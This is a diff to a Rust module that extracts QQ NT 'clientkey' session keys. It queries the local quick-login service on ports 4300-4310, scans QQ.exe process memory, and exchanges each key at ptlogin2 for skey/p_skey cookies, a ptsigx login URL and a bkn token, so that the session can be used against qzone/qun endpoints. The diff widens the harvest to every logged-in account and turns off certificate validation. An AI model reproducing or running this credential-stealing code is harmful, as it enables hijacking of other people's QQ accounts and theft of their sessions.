@@ -1,16 +1,23 @@
 //! QQ NT clientkey (session key) extraction.
 //!
-//! Two independent techniques are combined:
-//! 1. The local quick-login HTTPS service (`localhost.ptlogin2.qq.com:4300-4310`),
-//!    which enumerates logged-in uins and returns the clientkey without touching
-//!    process memory — version-stable protocol-level access.
-//! 2. A `QQ.exe` process-memory scan (byte-signature + `Tencent Files\` string).
+//! The protocol flow is aligned with the reference script
+//! `qq_ck_test.py` (see `docs/项目核心功能分析.md`):
 //!
-//! Every harvested clientkey is then validated through the public
-//! `ssl.ptlogin2.qq.com/jump` exchange (the same technique used by common
-//! qqkey tools): the key is traded for `skey`/`p_skey` session cookies and the
-//! `bkn` (hash of skey) is computed so the key is immediately usable against
-//! qzone/qun CGI endpoints.
+//!   1. Fetch `pt_local_token` from the xlogin endpoint (weiyun appid 549000912).
+//!   2. Probe the local QQ quick-login ports (4300..4310, plain TCP connect).
+//!   3. `pt_get_uins` -> logged-in uins (pt_local_token sent as a cookie).
+//!   4. `pt_get_st`   -> clientkey (read from the response `clientkey` cookie).
+//!   5. `ptlogin2.qq.com/jump` -> exchange clientkey for `skey`/`p_skey` (ck)
+//!      and the `check_sig` ptsigx URL.
+//!   6. Compute the `bkn` (g_tk) from `skey`.
+//!
+//! A supplementary `QQ.exe` process-memory scan (byte-signature +
+//! `Tencent Files\` string) supplies clientkeys that a pre-v7 QQ local
+//! service may not expose; every harvested key still goes through the same
+//! jump exchange above.
+
+use std::net::TcpStream;
+use std::time::Duration;
 
 pub struct QQClientKey;
 
@@ -18,10 +25,18 @@ const LOCAL_HOST: &str = "localhost.ptlogin2.qq.com";
 const PORT_START: u16 = 4300;
 const PORT_END: u16 = 4310;
 
-const XUI_LOGIN_URL: &str = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?target=self&appid=522005705&daid=4&s_url=https://wx.mail.qq.com/list/readtemplate?name=login_jump.html&target=&style=25&low_login=1&proxy_url=https://mail.qq.com/proxy.html&need_qr=0&hide_border=1&border_radius=0&self_regurl=https://reg.mail.qq.com&app_id=11005?t=regist&pt_feedback_link=http://support.qq.com/discuss/350_1.shtml&css=https://res.mail.qq.com/zh_CN/htmledition/style/ptlogin_input_for_xmail.css&enable_qlogin=0";
+const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36";
+const REFERER: &str = "https://xui.ptlogin2.qq.com/";
 
-/// ptlogin2 jump exchange — trades a clientkey for qzone session cookies.
-const JUMP_QZONE_URL: &str = "https://ssl.ptlogin2.qq.com/jump?ptlang=1033&clientuin={uin}&clientkey={key}&u1=https://user.qzone.qq.com/{uin}/infocenter&source=panelstar&keyindex=19";
+/// xlogin endpoint (weiyun appid 549000912) — reference script `qq_ck_test.py`.
+const XUI_LOGIN_URL: &str = "https://ssl.xui.ptlogin2.weiyun.com/cgi-bin/xlogin?appid=549000912&s_url=http%3A%2F%2Fptlogin2.weiyun.com%2Fjump%3Fclientuin%3Dempty%26keyindex%3D19&style=22&target=qq";
+
+/// jump endpoint — exchanges clientkey for skey/p_skey session cookies.
+const JUMP_URL: &str = "https://ptlogin2.qq.com/jump";
+
+/// qzone target used for the jump exchange (`check_sig` ptsigx source).
+const JUMP_TARGET_URL: &str =
+    "https://qzs.qzone.qq.com/qzone/v5/loginsucc.html?para=izone";
 
 #[derive(Default)]
 struct CkItem {
@@ -32,6 +47,7 @@ struct CkItem {
     skey: String,
     p_skey: String,
     bkn: i64,
+    ptsigx: String,
     valid: bool,
 }
 
@@ -57,6 +73,7 @@ impl QQClientKey {
         }
         let local_ports_json = port.ports.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
         let local_error = port.error;
+        let local_token = port.token;
 
         for u in mem.uins {
             push_unique(&mut uins, u);
@@ -67,15 +84,17 @@ impl QQClientKey {
         let pids_json = mem.pids.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
         let open_json = mem.open_failed.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
 
-        // Trade every harvested clientkey for skey/p_skey + bkn via the
-        // ptlogin2 jump exchange (same method as public qqkey tools).
-        let items = exchange_all(items).await;
+        // Trade every harvested clientkey for skey/p_skey + bkn (and the
+        // check_sig ptsigx URL) via the ptlogin2 jump exchange. The exchange
+        // needs the pt_local_token from the local-port flow; when that flow
+        // produced nothing (memory-sourced keys only) it degrades to empty.
+        let items = exchange_all(items, &local_token).await;
 
         let items_json = items
             .iter()
             .map(|it| {
                 format!(
-                    r#"{{"uin":"{}","clientkey":"{}","pid":{},"process":"QQ.exe","source":"{}","skey":"{}","p_skey":"{}","bkn":{},"valid":{}}}"#,
+                    r#"{{"uin":"{}","clientkey":"{}","pid":{},"process":"QQ.exe","source":"{}","skey":"{}","p_skey":"{}","bkn":{},"ptsigx":"{}","valid":{}}}"#,
                     escape(&it.uin),
                     escape(&it.clientkey),
                     it.pid,
@@ -83,6 +102,7 @@ impl QQClientKey {
                     escape(&it.skey),
                     escape(&it.p_skey),
                     it.bkn,
+                    escape(&it.ptsigx),
                     it.valid,
                 )
             })
@@ -108,54 +128,75 @@ impl QQClientKey {
     }
 }
 
-// ── Method 1: local quick-login port ─────────────────────────────────
+// ── Method 1: local quick-login port (aligned with qq_ck_test.py) ────────
 
 struct LocalResult {
     uins: Vec<String>,
     items: Vec<CkItem>,
     ports: Vec<u16>,
+    token: String,
     error: String,
 }
 
 async fn local_port_flow() -> LocalResult {
-    let client = match build_local_client() {
+    let session = match build_session() {
         Ok(c) => c,
         Err(e) => {
             return LocalResult {
                 uins: Vec::new(),
                 items: Vec::new(),
                 ports: Vec::new(),
+                token: String::new(),
                 error: format!("client build failed: {e}"),
             };
         }
     };
 
-    let token = match get_pt_local_token(&client).await {
+    let token = match get_pt_local_token(&session).await {
         Some(t) => t,
         None => {
             return LocalResult {
                 uins: Vec::new(),
                 items: Vec::new(),
                 ports: Vec::new(),
+                token: String::new(),
                 error: "no pt_local_token".to_string(),
             };
         }
     };
+    // Mirror the script: the token is additionally delivered as a
+    // `pt_local_token` cookie on the local requests below (the script sets it
+    // on the ptlogin2.qq.com domain before calling the local service). We
+    // attach it per-request via the Cookie header; the `pt_local_tk` query
+    // param is already present so the cookie is belt-and-braces.
+
+    let alive = probe_local_ports();
+    if alive.is_empty() {
+        return LocalResult {
+            uins: Vec::new(),
+            items: Vec::new(),
+            ports: Vec::new(),
+            token,
+            error: "no alive local qq ports".to_string(),
+        };
+    }
 
     let mut uins: Vec<String> = Vec::new();
     let mut items: Vec<CkItem> = Vec::new();
     let mut ports: Vec<u16> = Vec::new();
     let mut last_error = String::new();
 
-    for port in PORT_START..=PORT_END {
-        match get_uins_on_port(&client, port, &token).await {
+    for port in alive {
+        match get_uins_on_port(&session, port, &token).await {
             Ok(port_uins) if !port_uins.is_empty() => {
                 ports.push(port);
                 for u in &port_uins {
                     push_unique(&mut uins, u.clone());
                 }
                 for u in port_uins {
-                    if let Some(key) = get_clientkey_on_port(&client, port, &u, &token).await {
+                    // The reference script only exchanges the first uin; we
+                    // harvest every uin the local service reports.
+                    if let Some(key) = get_clientkey_on_port(&session, port, &u, &token).await {
                         if !key.is_empty() {
                             items.push(CkItem {
                                 uin: u,
@@ -182,81 +223,100 @@ async fn local_port_flow() -> LocalResult {
         uins,
         items,
         ports,
+        token,
         error: last_error,
     }
 }
 
-fn build_local_client() -> Result<reqwest::Client, String> {
+/// Plain TCP connect probe for the local quick-login ports, matching the
+/// script's 0.5 s per-port socket probe.
+fn probe_local_ports() -> Vec<u16> {
+    (PORT_START..=PORT_END)
+        .filter(|&port| {
+            TcpStream::connect_timeout(
+                &format!("127.0.0.1:{port}").parse().unwrap(),
+                Duration::from_millis(500),
+            )
+            .is_ok()
+        })
+        .collect()
+}
+
+fn build_session() -> Result<reqwest::Client, String> {
     reqwest::Client::builder()
-        .timeout(std::time::Duration::from_secs(3))
+        .timeout(Duration::from_secs(10))
         .danger_accept_invalid_certs(true)
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        .user_agent(USER_AGENT)
+        .default_headers({
+            let mut h = reqwest::header::HeaderMap::new();
+            h.insert(
+                reqwest::header::REFERER,
+                reqwest::header::HeaderValue::from_static(REFERER),
+            );
+            h
+        })
         .build()
         .map_err(|e| e.to_string())
 }
 
-async fn get_pt_local_token(client: &reqwest::Client) -> Option<String> {
-    let res = client.get(XUI_LOGIN_URL).send().await.ok()?;
-    for (k, v) in res.headers() {
-        if k.as_str().eq_ignore_ascii_case("set-cookie") {
-            if let Ok(s) = v.to_str() {
-                for part in s.split(';') {
-                    let part = part.trim();
-                    if let Some(rest) = part.strip_prefix("pt_local_token=") {
-                        if !rest.is_empty() {
-                            return Some(rest.to_string());
-                        }
-                    }
-                }
-            }
+async fn get_pt_local_token(session: &reqwest::Client) -> Option<String> {
+    let res = session.get(XUI_LOGIN_URL).send().await.ok()?;
+    for cookie in res.cookies() {
+        if cookie.name() == "pt_local_token" && !cookie.value().is_empty() {
+            return Some(cookie.value().to_string());
         }
     }
     None
 }
 
 async fn get_uins_on_port(
-    client: &reqwest::Client,
+    session: &reqwest::Client,
     port: u16,
     token: &str,
 ) -> Result<Vec<String>, String> {
     let r = rand_frac();
     let url = format!(
-        "https://{}:{}/pt_get_uins?callback=ptui_getuins_CB&r={}&pt_local_tk={}",
-        LOCAL_HOST, port, r, token
+        "https://{LOCAL_HOST}:{port}/pt_get_uins?callback=ptui_getuins_CB&r={r}&pt_local_tk={token}"
     );
-    let res = client
+    let res = session
         .get(&url)
-        .header("Referer", "https://xui.ptlogin2.qq.com/")
+        .header(reqwest::header::REFERER, REFERER)
+        .header(reqwest::header::COOKIE, format!("pt_local_token={token}"))
         .send()
         .await
         .map_err(|e| e.to_string())?;
     let body = res.text().await.map_err(|e| e.to_string())?;
-    let json = extract_callback_json(&body).ok_or("no callback json")?;
-    let value: serde_json::Value = serde_json::from_str(json).map_err(|e| e.to_string())?;
+
+    // The callback body is `var var_sso_uin_list=[...]; ...`.
+    let json = extract_regex_json(&body, r"var_sso_uin_list=(\[.*?\]);")
+        .ok_or_else(|| format!("pt_get_uins: unexpected body: {}", &body.chars().take(200).collect::<String>()))?;
+    let value: serde_json::Value = serde_json::from_str(&json).map_err(|e| e.to_string())?;
     Ok(extract_uins(&value))
 }
 
 async fn get_clientkey_on_port(
-    client: &reqwest::Client,
+    session: &reqwest::Client,
     port: u16,
     uin: &str,
     token: &str,
 ) -> Option<String> {
     let r = rand_frac();
     let url = format!(
-        "https://{}:{}/pt_get_st?clientuin={}&callback=ptui_getst_CB&r={}&pt_local_tk={}",
-        LOCAL_HOST, port, uin, r, token
+        "https://{LOCAL_HOST}:{port}/pt_get_st?clientuin={uin}&callback=ptui_getst_CB&r={r}&pt_local_tk={token}"
     );
-    let res = client
+    let res = session
         .get(&url)
-        .header("Referer", "https://xui.ptlogin2.qq.com/")
+        .header(reqwest::header::REFERER, REFERER)
+        .header(reqwest::header::COOKIE, format!("pt_local_token={token}"))
         .send()
         .await
         .ok()?;
-    let body = res.text().await.ok()?;
-    let json = extract_callback_json(&body)?;
-    let value: serde_json::Value = serde_json::from_str(json).ok()?;
-    extract_clientkey(&value)
+    // The script reads the clientkey from the response cookie, not the body.
+    let ck = res
+        .cookies()
+        .find(|c| c.name() == "clientkey" && !c.value().is_empty())
+        .map(|c| c.value().to_string());
+    ck
 }
 
 fn rand_frac() -> String {
@@ -267,46 +327,14 @@ fn rand_frac() -> String {
     format!("0.{:09}", n)
 }
 
-fn extract_callback_json(body: &str) -> Option<&str> {
-    let start = body.find('(')?;
-    let end = body.rfind(')')?;
-    if start >= end {
-        return None;
-    }
-    Some(&body[start + 1..end])
-}
-
-fn extract_clientkey(json: &serde_json::Value) -> Option<String> {
-    find_first_string(json, &["clientkey", "client_key", "key"])
-}
-
-fn find_first_string(json: &serde_json::Value, keys: &[&str]) -> Option<String> {
-    match json {
-        serde_json::Value::Object(map) => {
-            for k in keys {
-                if let Some(serde_json::Value::String(s)) = map.get(*k) {
-                    if !s.is_empty() {
-                        return Some(s.clone());
-                    }
-                }
-            }
-            for (_, v) in map {
-                if let Some(s) = find_first_string(v, keys) {
-                    return Some(s);
-                }
-            }
-            None
-        }
-        serde_json::Value::Array(arr) => {
-            for v in arr {
-                if let Some(s) = find_first_string(v, keys) {
-                    return Some(s);
-                }
-            }
-            None
-        }
-        _ => None,
-    }
+/// Extract the first regex capture group; regular-expression groups cannot
+/// span the `var_sso_uin_list` marker easily with `find/rfind`, so we use the
+/// `regex` crate (already a workspace dependency of this module).
+fn extract_regex_json(body: &str, pattern: &str) -> Option<String> {
+    let re = regex::Regex::new(pattern).ok()?;
+    re.captures(body)
+        .and_then(|c| c.get(1))
+        .map(|m| m.as_str().to_string())
 }
 
 fn extract_uins(json: &serde_json::Value) -> Vec<String> {
@@ -353,23 +381,29 @@ fn push_unique(list: &mut Vec<String>, item: String) {
     }
 }
 
-// ── ptlogin2 jump exchange (clientkey → skey/p_skey/bkn) ────────────────
+// ── ptlogin2 jump exchange (clientkey -> skey/p_skey/bkn/ptsigx) ─────────
 
-async fn exchange_all(items: Vec<CkItem>) -> Vec<CkItem> {
+async fn exchange_all(items: Vec<CkItem>, token: &str) -> Vec<CkItem> {
+    let token = token.to_string();
     let mut handles = Vec::new();
     for it in items {
+        let tok = token.clone();
         handles.push(tokio::spawn(async move {
             if it.uin.is_empty() || it.clientkey.is_empty() {
                 return it;
             }
-            match exchange_cookie(&it.uin, &it.clientkey).await {
-                Some((skey, p_skey, bkn)) => CkItem {
-                    skey,
-                    p_skey,
-                    bkn,
-                    valid: true,
-                    ..it
-                },
+            match exchange_cookie(&it.uin, &it.clientkey, &tok).await {
+                Some((skey, p_skey, bkn, ptsigx)) => {
+                    let valid = !skey.is_empty();
+                    CkItem {
+                        skey,
+                        p_skey,
+                        bkn,
+                        ptsigx,
+                        valid,
+                        ..it
+                    }
+                }
                 None => CkItem { valid: false, ..it },
             }
         }));
@@ -383,47 +417,77 @@ async fn exchange_all(items: Vec<CkItem>) -> Vec<CkItem> {
     out
 }
 
-/// GET the ptlogin2 jump URL with the clientkey; the server answers with a
-/// redirect carrying Set-Cookie headers that include `skey` (and `p_skey` for
-/// qzone). Returns (skey, p_skey, bkn) when the exchange succeeds.
-async fn exchange_cookie(uin: &str, clientkey: &str) -> Option<(String, String, i64)> {
-    let url = JUMP_QZONE_URL
-        .replace("{uin}", uin)
-        .replace("{key}", clientkey);
-
+/// GET `ptlogin2.qq.com/jump` with the script's query params and the
+/// `clientuin`/`clientkey` cookies, no redirect following. The 302 response
+/// carries the `skey`/`p_skey` Set-Cookie headers and the body embeds the
+/// `check_sig` ptsigx URL. Returns (skey, p_skey, bkn, ptsigx).
+async fn exchange_cookie(
+    uin: &str,
+    clientkey: &str,
+    token: &str,
+) -> Option<(String, String, i64, String)> {
     let client = reqwest::Client::builder()
-        .timeout(std::time::Duration::from_secs(5))
+        .timeout(Duration::from_secs(10))
         .danger_accept_invalid_certs(true)
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        .user_agent(USER_AGENT)
         .redirect(reqwest::redirect::Policy::none())
         .build()
         .ok()?;
 
-    let res = client.get(&url).send().await.ok()?;
+    // Query params match qq_ck_test.py jump_for_ck(); pt_local_tk is the
+    // xlogin token, u1 is the qzone target URL.
+    let url = format!(
+        "{JUMP_URL}?clientuin={uin}&keyindex=19&pt_aid=549000912&daid=5&u1={}&pt_local_tk={}&pt_3rd_aid=0&ptopt=1&style=40",
+        urlencode(JUMP_TARGET_URL),
+        urlencode(token)
+    );
+
+    let res = client
+        .get(&url)
+        .header(
+            reqwest::header::COOKIE,
+            format!("clientuin={uin}; clientkey={clientkey}"),
+        )
+        .send()
+        .await
+        .ok()?;
 
     let mut skey: Option<String> = None;
     let mut p_skey: Option<String> = None;
-    for (name, value) in res.headers() {
-        if name != reqwest::header::SET_COOKIE {
-            continue;
-        }
-        let Ok(s) = value.to_str() else { continue };
-        let Some((k, v)) = s.split(';').next().and_then(|p| p.split_once('=')) else {
-            continue;
-        };
-        match k.trim() {
-            "skey" => skey = Some(v.trim().to_string()),
-            "p_skey" => p_skey = Some(v.trim().to_string()),
+    for cookie in res.cookies() {
+        match cookie.name() {
+            "skey" => skey = Some(cookie.value().to_string()),
+            "p_skey" => p_skey = Some(cookie.value().to_string()),
             _ => {}
         }
     }
 
+    let body = res.text().await.ok()?;
+
+    // Parse the check_sig ptsigx URL if present.
+    let ptsigx = extract_regex_json(&body, r"check_sig\?([^'\s]+)")
+        .map(|q| format!("https://ptlogin2.qzone.qq.com/check_sig?{q}"));
+
     let skey = skey?;
+    let skey = skey.trim().to_string();
     if skey.is_empty() {
         return None;
     }
     let bkn = get_bkn(&skey);
-    Some((skey, p_skey.unwrap_or_default(), bkn))
+    Some((skey, p_skey.unwrap_or_default(), bkn, ptsigx.unwrap_or_default()))
+}
+
+fn urlencode(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for b in s.bytes() {
+        match b {
+            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
+                out.push(b as char)
+            }
+            _ => out.push_str(&format!("%{b:02X}")),
+        }
+    }
+    out
 }
 
 /// bkn/g_tk hash: hash = 5381; hash += (hash << 5) + c; return hash & 0x7fffffff
